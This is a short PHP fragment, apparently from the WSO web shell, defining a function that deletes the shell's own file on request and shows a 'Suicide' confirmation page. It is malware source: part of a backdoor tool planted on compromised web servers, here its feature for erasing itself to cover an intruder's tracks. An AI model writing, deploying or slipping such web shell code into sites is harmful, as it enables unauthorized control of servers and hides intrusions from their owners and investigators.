<?php
function actionSelfRemove() {

	if($_POST['p1'] == 'yes')
		if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('Shell removed');
		else
			echo 'unlink error!';
    if($_POST['p1'] != 'yes')
        wsoHeader();
	echo '<h1>Suicide</h1><div class=content>remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
	wsoFooter();
}